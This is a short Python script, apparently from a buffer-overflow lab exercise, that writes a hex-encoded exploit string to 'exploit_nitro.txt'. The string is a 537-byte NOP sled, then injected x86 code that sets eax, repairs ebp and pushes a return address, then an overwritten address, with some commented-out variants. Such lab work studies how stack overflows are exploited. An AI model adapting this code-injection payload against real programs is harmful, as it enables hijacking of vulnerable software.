from struct import *

buf = ""

#exploit code
buf += ("90 ")*537
#buf += "8d 6c 24 24 b8 06 de 2b 49 68 1f 8f 04 08 c3 "
buf += "b8 06 de 2b 49 8d 6c 24 28 68 1f 8f 04 08 c3 "
#buf += "8d 6c 24 28 b8 06 d3 2b 49 c7 45 f4 06 de 2b 49 68 1f 8f 04 08 c3 "

buf += "c4 33 68 55"
f = open("exploit_nitro.txt", "w") #sets up to write to file
f.write(buf) #writes to file

